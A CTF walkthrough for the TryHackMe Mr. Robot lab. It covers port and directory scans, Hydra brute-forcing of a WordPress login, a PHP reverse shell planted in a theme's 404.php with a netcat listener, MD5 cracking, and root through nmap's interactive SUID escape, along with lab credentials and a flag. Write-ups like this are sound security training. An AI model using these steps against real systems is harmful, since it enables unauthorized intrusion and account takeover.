# Mr. Robot CTF Walkthrough

## Introduction
This is a walkthrough for the **Mr. Robot CTF** challenge from TryHackMe. In this guide, we will go through the steps to exploit a vulnerable machine and capture all three keys.

![Intro Image](https://raw.githubusercontent.com/Grois333/WordPress-Hacking-Penetration-Testing/refs/heads/master/6.%20Mr%20Robot%20CTF/images/intro-image.webp)

---

## Steps to Complete the Challenge

### 1. Deploy the Machine
- Start the **Mr. Robot** machine on TryHackMe.
- Get the target IP address (e.g., `10.10.134.44`).

### 2. Inspect the Website
- Visit `http://10.10.134.44/`.
- Check the page source code. There is an ASCII-style comment in the HTML.

```html
<!--
\   //~~\ |   |    /\  |~~\|~~  |\  | /~~\~~|~~    /\  |  /~~\ |\  ||~~
 \ /|    ||   |   /__\ |__/|--  | \ ||    | |     /__\ | |    || \ ||--
  |  \__/  \_/   /    \|  \|__  |  \| \__/  |    /    \|__\__/ |  \||__
-->
```
- The site contains references to the **Mr. Robot** TV show, but nothing useful for exploitation.

![Easter Egg Image](https://raw.githubusercontent.com/Grois333/WordPress-Hacking-Penetration-Testing/refs/heads/master/6.%20Mr%20Robot%20CTF/images/eateregg.webp)

### 3. Scan for Open Ports
- Run `nmap` to scan the target:
  ```bash
  nmap 10.10.134.44 -sV -T4 -oA nmap-scan -open
  ```
- Results:
  - **80/tcp open** (Apache httpd web server)

### 4. Enumerate Directories
- Use **gobuster** to find hidden directories:
  ```bash
  gobuster dir -u http://10.10.134.44 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
  ```
- Interesting results:
  - `/blog/`
  - `/wp-login/` (WordPress login page)
  - `/robots.txt` (contains file listings)
  - `/license` (contains a Base64 encoded string)

### 5. Inspect robots.txt
- Visit `http://10.10.134.44/robots.txt`
- Files listed:
  - `fsocity.dic`
  - `key-1-of-3.txt`
- Get the first key: `http://10.10.134.44/key-1-of-3.txt`
  ```bash
  curl http://10.10.134.44/key-1-of-3.txt
  ```
  **First Key:** `073403c8a58a1f80d943455fb30724b9`

### 6. WordPress Login Brute Force
- Get the dictionary file from `fsocity.dic`:
  ```bash
  curl -O http://10.10.134.44/fsocity.dic
  ```

 In this directory http://10.10.134.44/license by inspecting source code we find a base64 string:
   ```ZWxsaW90OkVSMjgtMDY1Mgo=```

 If we go to https://gchq.github.io/CyberChef/ we can decode it from Base64, and we get a pair of credentials that might be useful somewhere

- Check `/license` for credentials:
  ```bash
  curl http://10.10.134.44/license
  ```
- Decode Base64 string `ZWxsaW90OkVSMjgtMDY1Mgo=`:
  ```bash
  echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
  ```
  - **Username:** `elliot`
  - **Password:** `ER28-0652`
- Login at `http://10.10.134.44/wp-login.php`
 
 Login and Success! Its an admin user.

---

#### Option 2:

(Using Burp Suite with FoxyProxy plugin to intercept requests)

Check the error message of a failed login attempt. We will need this message for performing a dictionary attack using Hydra.

1. Capture the packet of the failed login attempt with Burp Suite’s Proxy to find its parameters. We will also need these for performing the dictionary attack with Hydra.
2. Perform a dictionary attack with Hydra to build a wordlist containing valid usernames.
3. Perform a second dictionary attack using the newly-created username wordlist to find passwords, again, using Hydra.

Let’s try to log in with random credentials:

- When trying to log in using `Admin` as both the username and password, it comes back with `ERROR: Invalid username.` message. Note that down!
- Next, let’s capture a failed login request using Burp Suite’s Proxy.
- We notice that on line 15 of this packet capture, there are two parameters: `log` and `pwd`.

We are already halfway through our plan: we have the error message and the POST request parameters. We will use both to build a valid username list.

#### Extracting a refined wordlist:

URL: `http://10.10.134.44/fsocity.dic`

The provided wordlist contains 858,160 words, with many duplicates. We can use the following commands to create a new file called `fs-list`, containing only unique values, reducing the word count to 11,451:

```sh
wc -w fsocity.dic # check word count
# 858160

sort fsocity.dic | uniq -d > fs-list # write the repeated words on fs-list
sort fsocity.dic | uniq -u >> fs-list # append the unique words on fs-list

wc -w fs-list # check word count
# 11451
```

Now, we are ready to pass the new wordlist to Hydra and create the list with valid usernames:

```sh
hydra -L fs-list -p test <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

We use the string from the invalid username failure attempt so Hydra knows it's not a valid response.

The expected result should reveal the username `Elliot`. Now, we can use it to get more invalid attempts.

#### Finding the Password:

We are almost done! Now that we have a valid username, we can try to use it, log in, and see what happens.

- The error message has changed, indicating we now have a valid username.
- We can now reverse the process to find Elliot’s password using Hydra with the valid static username (`elliot`) and pass our refined wordlist (`fs-list`) as the password list:

```sh
hydra -l elliot -P fs-list <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

The output of the above command should give us the password:

**`ER28-0652`** (From the TV show, it's Elliot's employee number.)

We can now use the obtained credentials to log in.

**And we are in!**

---


### 7. Gain a Reverse Shell

And we are in! So now we can try to set up a reverse shell and get our first foothold on the server:
 
Get Revershell code from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php set it up on the 404.php template or  Twenty Fifteen: Stylesheet (style.css)

- Upload a PHP reverse shell using **404.php** or **style.css**.
  ```php
  $ip = 'YOUR_IP';
  $port = 1234;
  ```
- Start a Netcat listener:
  ```bash
  nc -lnvp 1234
  ```
- Trigger the shell by visiting:
  ```
  http://10.10.134.44/wp-content/themes/twentyfifteen/404.php
  ```
- Shell received! 🎉

### 8. Enumerate the File System
- Navigate to `robot` user’s home directory:
  ```bash
  cd /home/robot
  ls
  ```
- Files found:
  - `key-2-of-3.txt` (permission denied)
  - `password.raw-md5`
- Crack MD5 hash:
  ```bash
  echo 'c3fcd3d76192e4007dfb496cca67e13b' | crackstation
  ```
  - **Password:** `abcdefghijklmnopqrstuvwxyz`

### 9. Get Second Key
- Switch user:
  ```bash
  su robot
  ```
- Password: `abcdefghijklmnopqrstuvwxyz`
- Read the second key:
  ```bash
  cat key-2-of-3.txt
  ```
- **Second Key:** 🎯

### 10. Privilege Escalation to Root
- Check for **SUID binaries**:
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  ```
- Use `nmap` interactive mode exploit:
  ```bash
  nmap --interactive
  !sh
  ```
- Gain root access! 🎉
- Get the final key:
  ```bash
  cat /root/key-3-of-3.txt
  ```

---

## Conclusion
By following these steps, we successfully gained access to the Mr. Robot CTF machine and captured all three flags! 🏆

**References:**
- [TryHackMe - Mr. Robot Room](https://tryhackme.com/room/mrrobot)
- [Pentest Monkey Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [Medium 1](https://medium.com/@cspanias/thms-mr-robot-ctf-walkthrough-2023-55ca5c19fbaf)
- [Medium 2](https://medium.com/azkrath/tryhackme-walkthrough-mr-robot-ctf-9e9eecd2036)
- [YouTube](https://youtu.be/BQ4xeeNAbaw)

Happy hacking! 🕵️‍♂️💻


Badge Obtained:

![Badge Image](https://raw.githubusercontent.com/Grois333/WordPress-Hacking-Penetration-Testing/refs/heads/master/6.%20Mr%20Robot%20CTF/images/mrrobot-badge.png)